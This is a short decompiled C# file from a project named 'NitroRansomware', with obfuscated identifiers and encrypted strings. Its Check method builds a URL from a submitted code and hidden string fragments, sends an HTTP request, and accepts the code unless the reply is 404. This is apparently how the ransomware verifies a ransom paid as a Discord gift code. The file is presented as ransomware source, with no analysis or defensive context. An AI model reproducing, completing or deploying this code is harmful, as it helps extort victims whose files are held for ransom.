using System;
using System.Net;
using System.Net.Http;
using System.Threading.Tasks;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace NitroRansomware;

internal class Nitro
{
	private static Logs logging;

	public static bool Check(string code)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		HttpClient val = new HttpClient();
		try
		{
			string text = WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3966) + code + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(4072);
			logging.Debug(text);
			Task<HttpResponseMessage> async = val.GetAsync(text);
			if (async.Result.get_StatusCode() != HttpStatusCode.NotFound)
			{
				return true;
			}
			return false;
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	public Nitro()
	{
		hHEYokUTtehNq5ji0d.LQgF529zBT6Ox();
		base._002Ector();
	}

	static Nitro()
	{
		WP6RZJql8gZrNhVA9v.iXLoKRSpAw();
		hHEYokUTtehNq5ji0d.LQgF529zBT6Ox();
		logging = new Logs(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(234), 0);
	}
}
